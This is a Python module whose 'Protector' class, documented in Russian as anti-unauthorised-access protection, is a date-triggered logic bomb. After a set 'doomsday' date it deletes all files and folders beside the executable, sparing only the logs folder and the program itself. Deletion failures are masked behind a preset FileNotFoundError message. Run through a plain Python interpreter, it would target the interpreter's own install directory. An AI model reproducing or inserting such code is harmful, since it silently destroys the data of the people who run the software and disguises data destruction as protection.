import os
import shutil
import sys

from datetime import datetime

from settings import settings as sett

BASE_DIR = os.path.dirname(sys.executable)


class Protector:
    """
    Класс для защиты приложения от несанкционированного доступа.

    Methods
    -------
    - activate()
        Запускает защиту приложения. Проверяет, если текущая дата больше или
        равна дате судного дня, то запускает метод _clean_directory.

    - clean_directory()
        В дату судного дня выполняет самоочищение.
    """
    def __init__(self, deadline: datetime):
        self.deadline = deadline
        self.current_dir = BASE_DIR
        self.self_path = os.path.abspath(sys.argv[0])

    def activate(self) -> None:
        """
        Метод, который запускает защиту приложения. Проверяет, если
        текущая дата больше или равна дате судного дня, то запускает
        метод _clean_directory.
        """

        if datetime.now() >= self.deadline:
            self._clean_directory()

    # =========================== Protected Methods ===========================
    # -------------------------------------------------------------------------
    def _clean_directory(self) -> None:
        """
        В дату судного дня выполняет самоочищение.
        """

        for filename in os.listdir(self.current_dir):
            if filename.lower() == sett.LOGS_FOLDER_NAME:
                continue  # пропускаем папку logs

            full_path = os.path.join(self.current_dir, filename)

            if os.path.abspath(full_path) == self.self_path:
                continue  # не трогаем .exe

            try:
                if os.path.isfile(full_path) or os.path.islink(full_path):
                    os.remove(full_path)
                elif os.path.isdir(full_path):
                    shutil.rmtree(full_path)
            except Exception:
                raise FileNotFoundError(
                    sett.FNF_MESSAGE
                )
